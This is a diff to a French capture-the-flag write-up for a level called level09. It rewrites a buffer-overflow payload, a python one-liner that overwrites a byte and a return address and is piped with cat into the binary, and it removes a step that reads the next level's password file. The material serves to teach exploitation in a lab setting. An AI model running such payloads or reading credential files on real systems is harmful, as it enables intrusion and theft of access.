@@ -205,14 +205,8 @@ appelle `fgets(cmd, 0x80, stdin)`. Si stdin est fermé (pipe simple), elle lit E
 `system("")` ne fait rien. Avec `cat`, stdin reste ouvert et on peut taper la commande.
 
 ```bash
-(python -c "import sys; sys.stdout.write('A'*40 + '\xd0' + '\n' + 'B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n')"; cat) | ./level09
+(python -c 'print "A"*40 + "\xd0" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
 ```
-
-Puis taper :
-```
-cat /home/users/end/.pass
-```
-
 ---
 
 ## Résumé de la chaîne d'exploitation
